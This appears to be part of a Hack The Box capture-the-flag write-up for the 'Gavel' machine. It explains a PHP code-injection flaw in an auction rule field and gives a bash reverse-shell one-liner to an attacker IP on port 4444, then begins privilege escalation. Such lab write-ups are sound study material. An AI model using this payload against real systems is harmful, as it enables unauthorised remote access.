### Vulnerability discovering
There is a vulnerability in the code that may lead to RCE:
```php
// -> bid_handler.php

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

`runkit_function_add()` creates a PHP function at execution time using the content of `$rule` as the function body.

The `$rule` variable comes directly from the database, so the `auctioneer` account can modify it through `admin.php`.
```php
// -> admin.php

    if ($auction_id > 0 && $rule && $message) {
        $stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
        $stmt->execute([$rule, $message, $auction_id]);
```

### RCE exploitation
At `admin.php` we can write a reverse shell in the `rule` box:
![](/img/htb_img/Gavel_img/img5.png)

```
system('bash -c "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1"'); return true;
```

We fire up a reverse shell handler and place a bid on the `Invisible Cloak` item.
After that we will probably get an `Unexpected error`, but a reverse shell at the same time.

# Privilege Escalation

```

Sorry, user auctioneer may not run sudo on gavel.

```

We are part of the `gavel-seller` group:
```
auctioneer@gavel:~$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

So, let's look for files from this group:

The interesting find: `/usr/local/bin/gavel-util`.
